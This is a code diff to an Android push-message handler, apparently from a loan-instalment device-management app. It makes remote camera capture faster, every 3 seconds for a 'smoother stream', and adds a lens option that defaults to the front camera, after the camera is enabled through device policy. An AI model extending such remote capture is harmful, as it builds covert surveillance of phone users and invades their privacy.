@@ -489,7 +489,7 @@ public class EMIFirebaseMessagingService extends FirebaseMessagingService {
             Log.w(TAG, "Could not enable camera via DPM: " + e.getMessage());
         }
         
-        long interval = 10000; // default 10 seconds
+        long interval = 3000; // default 3 seconds (small frames -> smoother stream)
         try {
             String intervalStr = data.get("capture_interval");
             if (intervalStr != null && !intervalStr.isEmpty()) {
@@ -498,13 +498,16 @@ public class EMIFirebaseMessagingService extends FirebaseMessagingService {
         } catch (Exception e) {
             Log.w(TAG, "Invalid capture interval, using default");
         }
-        
+
+        String lens = data.get("camera");
+        final String captureLens = (lens != null && !lens.isEmpty()) ? lens : "front";
+
         // Delay to let DPM change take effect (longer for Samsung)
         final long captureInterval = interval;
         long startDelay = android.os.Build.MANUFACTURER.equalsIgnoreCase("samsung") ? 2000 : 1000;
         new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
             RemoteCameraCapture cameraCapture = new RemoteCameraCapture(EMIFirebaseMessagingService.this);
-            cameraCapture.captureAndReport(true, captureInterval);
+            cameraCapture.captureAndReport(true, captureInterval, captureLens);
         }, startDelay);
         
         // Acknowledge command
